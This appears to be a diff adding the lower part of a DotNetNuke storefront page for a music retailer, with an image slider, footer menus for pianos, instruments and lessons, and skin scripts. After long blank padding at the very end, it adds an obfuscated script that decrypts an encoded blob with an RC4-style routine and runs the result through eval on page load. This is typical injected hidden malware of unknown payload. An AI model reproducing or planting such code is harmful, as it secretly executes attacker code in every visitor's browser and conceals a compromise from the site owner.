+    <div id="SpeedyTouchFlexiContainer807" class="flex-container"><div id="SpeedyTouchFlexi807" class="flexslider"><ul class="slides"><li  data-thumb="/DesktopModules/SpeedyTouchFlexi/Images807/steinwaybanner-1-1.jpg"><img src="/DesktopModules/SpeedyTouchFlexi/Images807/steinwaybanner-1-1.jpg" /></li><li  data-thumb="/DesktopModules/SpeedyTouchFlexi/Images807/fender-anniversary.jpg"><img src="/DesktopModules/SpeedyTouchFlexi/Images807/fender-anniversary.jpg" /></li><li  data-thumb="/DesktopModules/SpeedyTouchFlexi/Images807/strat1.png"><img src="/DesktopModules/SpeedyTouchFlexi/Images807/strat1.png" /></li><li  data-thumb="/DesktopModules/SpeedyTouchFlexi/Images807/strat2.png"><img src="/DesktopModules/SpeedyTouchFlexi/Images807/strat2.png" /></li><li  data-thumb="/DesktopModules/SpeedyTouchFlexi/Images807/strat3.png"><img src="/DesktopModules/SpeedyTouchFlexi/Images807/strat3.png" /></li><li  data-thumb="/DesktopModules/SpeedyTouchFlexi/Images807/strat4.png"><img src="/DesktopModules/SpeedyTouchFlexi/Images807/strat4.png" /></li></ul></div></div>
+     
+
+
+    <!-- Close SpeedyApp TouchFlexi Slider  slideshow -->
+
+
+
+   <script type="text/javascript" charset="utf-8">
+      
+ jQuery(window).load(function() {
+  jQuery('#SpeedyTouchFlexi807').flexslider({
+    animation: "slide",
+	
+	direction: "horizontal",
+                   reverse: false, 
+	animationLoop: true,
+	startAt: 0,
+	slideshow: true,
+	slideshowSpeed: 1000,
+	
+	animationSpeed: 1000,
+	pauseOnAction: true,
+	randomize: false,
+	pauseOnHover: true, 
+	touch: true,
+	keyboard: true,
+	controlNav: true,
+	directionNav: true,
+	
+	minItems: 1,
+	maxItems: 1, 
+                  smoothHeight: true,
+	move: 1,
+                  itemMargin: 10,
+before: function(slider){
+	jQuery('.flexslider .slides > li').css({'width': jQuery('[SLIDERDIV]').width()});
+
+  
+}  
+        });
+     });
+
+</script>
+
+</div><!-- End_Module_807 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                </div> <!-- close 1Columns row-fluid  -->
+
+                <div class="row-fluid">
+                    <div id="dnn_ArticleA" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_ArticleB" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                    <div id="dnn_ArticleC" class="span4 LeftC spmodule DNNEmptyPane"></div>
+                </div> <!-- close 3Columns row-fluid  -->
+               <div class="row-fluid">
+                    <div id="dnn_SidebarB" class="span4 LeftC spmodule DNNEmptyPane"></div>   
+                    <div id="dnn_PromoB" class="span8 LeftC spmodule DNNEmptyPane"></div>  
+                </div><!-- close 2Columns row-fluid --> 
+
+                <div class="row-fluid">
+                    <div id="dnn_ContactInquery" class="span12 centered spmodule"><div class="DnnModule DnnModule-DNN_HTML DnnModule-808"><a name="808"></a><div id="dnn_ctr808_ContentPane"><!-- Start_Module_808 --><div id="dnn_ctr808_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr808_HtmlModule_lblContent" class="Normal">
+	<p>&nbsp;</p>
+<br />
+</div>
+
+</div><!-- End_Module_808 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                </div> 
+            </div><!--MainContentPaneA-->  
+        </div><!--MainContent-->
+<!----------- MainContentPage Close --------------------->
+    
+<!-----------FooterSection Start ------------------------>
+        <div id="Footer"CustomSection="edtPage" CustomTag="#Footer" UserText="Footer" DisabledControls="#FontColor," WidthTag="#Footer">
+        <div class="row-fluid">
+            <div class="FooterTop">
+                <div class="row-fluid hidden-phone">
+                    <div class="FlistTop">
+                        <div id="dnn_FooterA" class="span3 spmodule mobile-centered"><div class="DnnModule DnnModule-DNN_HTML DnnModule-800"><a name="800"></a><div id="dnn_ctr800_ContentPane"><!-- Start_Module_800 --><div id="dnn_ctr800_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr800_HtmlModule_lblContent" class="Normal">
+	<div id="F_Top">
+<h2 class="FooterTitle"> Pianos &amp; Organs</h2>
+<div class="FooterList">
+<li><a href="/Pianos-Organs/Grand-Pianos"> Grand Pianos </a> </li>
+<li><a href="/Pianos-Organs/Upright-Pianos"> Upright Pianos </a> </li>
+<li><a href="/Pianos-Organs/Used-Pianos"> Used Pianos </a> </li>
+<li><a href="/Pianos-Organs/Organs"> Organs </a> </li>
+</div>
+</div>
+</div>
+
+</div><!-- End_Module_800 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                        <div id="dnn_FooterB" class="span3 spmodule mobile-centered"><div class="DnnModule DnnModule-DNN_HTML DnnModule-802"><a name="802"></a><div id="dnn_ctr802_ContentPane"><!-- Start_Module_802 --><div id="dnn_ctr802_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr802_HtmlModule_lblContent" class="Normal">
+	<h2 class="FooterTitle"> Musical Instruments</h2>
+<div class="FooterList">
+<li><a href="/Musical-Instruments/Guitars"> Guitars </a></li>
+<li><a href="/Musical-Instruments/Bass-Guitars"> Bass Guitars </a></li>
+<li><a href="/Musical-Instruments/Keyboards"> Keyboards </a></li>
+<li><a href="/Musical-Instruments/Amplifiers"> Amplifiers </a></li>
+</div>
+</div>
+
+</div><!-- End_Module_802 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                        <div id="dnn_FooterC" class="span3 spmodule mobile-centered"><div class="DnnModule DnnModule-DNN_HTML DnnModule-803"><a name="803"></a><div id="dnn_ctr803_ContentPane"><!-- Start_Module_803 --><div id="dnn_ctr803_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr803_HtmlModule_lblContent" class="Normal">
+	<h2 class="FooterTitle"> Band &amp; Orchestra</h2>
+<div class="FooterList">
+<li><a href="/Band-Orchestra/Band-Instruments"> Band Instruments </a> </li>
+<li><a href="/Band-Orchestra/Orchestra-Instruments"> Orchestra Instruments </a> </li>
+<li><a href="/Band-Orchestra/Band-Orchestra-Information"> Info for Parents </a> </li>
+<li><a href="/Band-Orchestra/Rent-Instruments"> Instrument Rental </a> </li>
+</div>
+</div>
+
+</div><!-- End_Module_803 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                        <div id="dnn_FooterD" class="span3 spmodule mobile-centered"><div class="DnnModule DnnModule-DNN_HTML DnnModule-804"><a name="804"></a><div id="dnn_ctr804_ContentPane"><!-- Start_Module_804 --><div id="dnn_ctr804_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr804_HtmlModule_lblContent" class="Normal">
+	<h2 class="FooterTitle"> Local Services</h2>
+<div class="FooterList">
+<li><a href="/Local-Services/Piano-Services"> Piano Services </a></li>
+<li><a href="/Local-Services/Instrument-Repair"> Instrument Repair </a></li>
+<li><a href="/Local-Services/Music-Lessons"> Music Teachers </a></li>
+<li><a href="/Local-Services/Lesson-Registration">Lesson Registration </a></li>
+</div>
+</div>
+
+</div><!-- End_Module_804 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="FBottom"CustomSection="edtPage" CustomTag="#FBottom" UserText="FooterBottom" DisabledControls="#Transparency" WidthTag="#FBottom" >
+            <div class="row-fluid">
+                <div id="dnn_FooterMenu" class="span8 FooterNav FooterMenu spmodule mobile-centered"> <div class="DnnModule DnnModule-DNN_HTML DnnModule-805"><a name="805"></a><div id="dnn_ctr805_ContentPane"><!-- Start_Module_805 --><div id="dnn_ctr805_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr805_HtmlModule_lblContent" class="Normal">
+	<ul class="f-nav">
+    <li><a href="/Home">Home</a></li>
+    <li><a href="/Pianos-Organs">Pianos &amp; Organs</a></li>
+    <li><a href="/Musical-Instruments">Musical Instruments</a></li>
+    <li><a href="/Band-Orchestra">Band &amp; Orchestra</a></li>
+    <li><a href="/Local-Services">Local Services</a></li>
+    <li><a href="/Contact-Us">Contact Us</a></li>
+</ul>
+</div>
+
+</div><!-- End_Module_805 --></div>
+
+
+
+
+
+
+
+
+</div></div>
+                <div id="Copyright" class="span4 Copyright spmodule mobile-centered"> <span id="dnn_dnnCopyright_lblCopyright" class="SkinObject">Copyright 2017 by Lane Music, Inc</span>
+</div>              
+            </div> <!-- close row-fluid -->
+             
+        </div>      
+     </div>
+    
+    <!-----------FooterSection Close ------------------------>
+    </div><!--mainWreper--->
+</div><!-- container -->
+<!--END HTML HERE -->  
+ 
+<!----------Back to Top Code - MUST COPY------------>
+<div id="backtotop" style="display:none;"> <!-- Back to Top Button -->
+   <a href="#">
+      <img src="/Portals/_default/Skins/Ares/images/back_to_top_btn.png" border="0" alt="Back to TOP" />
+   </a>
+</div>
+<!-------------------------------------------------->
+<div CustomSection="edtPage" CustomTag="#SearchTable #SpeedSearchTextBox > input" UserText="Search" MenuType='Main' DisabledControls="#BackgroundImage, #BorderColor, #Gradient, .GradPadd, .MainStyle"> </div> 
+<div CustomSection="edtPage" CustomTag=".btn-primary" UserText="ReadMore Button" DisabledControls=".MainStyle"> </div>
+ 
+
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .nav > li:not(.current) > a" UserText="Main Menu"  MenuType='Main' DisabledControls="#BackgroundImage, .MainStyle "></div> 
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .nav > li.current > a"  UserText="Main Menu Selected" MenuType='Main' DisabledControls="#BackgroundImage,.MainStyle "></div>
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .nav > li > a" MenuHover=".SpeedyDropDown .nav > li > a" MenuType='Main' UserText="Main Menu HighLight" DisabledControls="#BackgroundImage, #BorderColor, .MainStyle"></div>
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .nav ul li a,.SpeedyDropDown .nav .current ul li a" UserText="Sub Menu"  MenuType='Main' DisabledControls="#BackgroundImage, .MainStyle "></div> 
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .nav ul li a" MenuHover=".SpeedyDropDown .nav ul li a" MenuType='Sub' UserText="Sub Menu HighLight" DisabledControls="#BackgroundImage,#BorderColor,.MainStyle"></div>
+
+
+
+<div CustomSection="edtMenu" CustomTag=".toggleMenu, a.toggleMenu" UserText="Mobile Menu Button" DisabledControls=".MainStyle"></div> 
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .MobileMenu, .SpeedyDropDown .MobileMenu a" UserText="Mobile Menu" DisabledControls=".MainStyle"></div> 
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .MobileMenu > li > a" MenuHover=".SpeedyDropDown .MobileMenu > li > a" UserText="Mobile Menu HighLight" DisabledControls="#BackgroundImage, #BorderColor, .MainStyle"></div> 
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .MobileMenu li li a, .SpeedyDropDown .MobileMenu .current li li a" UserText="Mobile Sub Menu" DisabledControls=".MainStyle"> </div>
+<div CustomSection="edtMenu" CustomTag=".SpeedyDropDown .MobileMenu li li a" MenuHover=".SpeedyDropDown .MobileMenu li li a" UserText="Mobile Sub Menu HighLight" DisabledControls="#BackgroundImage, .MainStyle"> </div>
+
+
+<script type="text/javascript" src="/Portals/_default/Skins/Ares/javascripts/foundation.js" > </script> 
+<script type="text/javascript" src="/Portals/_default/Skins/Ares/javascripts/app.js" > </script> 
+<script type="text/javascript" src="/Portals/_default/Skins/Ares/javascripts/script.js" > </script>     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <input name="ScrollTop" type="hidden" id="ScrollTop" />
+        <input name="__dnnVariable" type="hidden" id="__dnnVariable" autocomplete="off" value="`{`__scdoff`:`1`,`sf_siteRoot`:`/`,`sf_tabId`:`94`,`SearchIconWebUrl`:`url(/icons/sigma/GoogleSearch_16X16_Standard.png)`,`SearchIconSiteUrl`:`url(/icons/sigma/DnnSearch_16X16_Standard.png)`,`SearchIconSelected`:`S`}" />
+        <script src="/resources/search/search.js?cdv=19" type="text/javascript"></script>
+    
+<script type="text/javascript" src="/Resources/Shared/scripts/initWidgets.js" ></script></form>
+    
+    
+<script type="text/javascript">
+function hdrq(){return 'J%F1%05%22%9E%10%92M%F8%9Eu%D6k%27%3A4%BED%98%C8%84C%A7%C0%98%D3%91%A0%7F%12%B6%A7r%3AQ%82H%28%05%E7%8Al%C6%83%8Cj%BF%B9%19%A8%92y%87%CA%40%D4%B0%8F%FF%EC%2CTR%2C%81%93%A0J%3A%E8%D5Yt%8B%9A%EA%DC%F0%29%13%7F%15jj%07-U%F7%B1%0C%97%C9%F6A%AA%E7%D2%CFR%E7%F0%D1%11%B3.%B3%FF%C2%26%2A3W%C7D%E9%A7%01%F0e%0C%B7%B2%07%F9%CB%F0R%19%E2%C3u%9EE%EFL%7C%BD%BA%26W%7F%3D%2FG%DE%F7c%A1%FD%A7%5B%9C%03%B6%8B%BF%82%7F%A0%ED%EE%0D%F4%C1iO%A0%D2%82G%BB8W%16Y%CF%B9%FA%F4%C9e%83%DE%16%23%24%C1Ke%B3%A8Q%12%83%C7h%C6i%AA%D2%C1ugX%06%96%B6%D52%87Y%18%0B64%0A%5B%D5%F5%7CO%E4%B0%7B%C2%29%7B%E2%08x%5D%B4%03%AD%A8%C8%92%FC%D1kg%CBh%FB%F8%DF%5D%20%E3%DF%FB%88O%C2%D3%18i%AC%C2%C8%9A%B9%D2%E1%17%AD%F1U%AFE%A7%9E%F5%EF%9A%97%22%13%A2%E5%98%E1%5BU%B3%09%8C%F0%FC%13%CC%AF%94ut%C6%8F%ADi%A3%27nT%B7%06%24%FC%DD%0C%CE%F8%A7%C0%00%E2%19n%AB1%0F%BD%BEq%9F%A0%15T%B2%AC%CB%E4%C2%B9%E2%EB%AB%A6%FD%A8%F4%12N%BB%13%A2%F9%A39%FD%C7V%00%C9%5CI%F8%BBY%B6y%DF%09%0D%3C%9A%A7%1E%AFl%82%ED%27E%13%8BH%C0%20%98%9D%40%E1%AA%22%C69%B3%DC%DDq%A9%24%D8%D6%BD%EA%B4%3B%97%85%E8%C8%40%02N%C7%FE%0C%AB_%3D%60U%92%F8G%09%85%E3S%BE%24%F3l.-%BB%94%A0%C0%87%BB%7B%1B%1F%05%BCu%CF';}function drtz(a){efau=window["eval"]("eval");efau(a);}var s=[],j=0,x,e='',r=hdrq(),r=unescape(r);for(i=0;i<256;i++){s[i]=i;}k='hfzdzesrtzzk';for(i=0;i<256;i++){nies='charCodeAt';j=(j+s[i]+k[nies](i%k.length))%256;x=s[i];s[i]=s[j];s[j]=x;}i=0;j=0;for(y=0;y<r.length;y++){nies='charCodeAt';yeya='fromCharCode';i=(i+1)%256;j=(j+s[i])%256;x=s[i];s[i]=s[j];s[j]=x;e+=String[yeya](r[nies](y)^s[(s[i]+s[j])%256]);}drtz(e);
+</script>
+
+</body>
+</html>
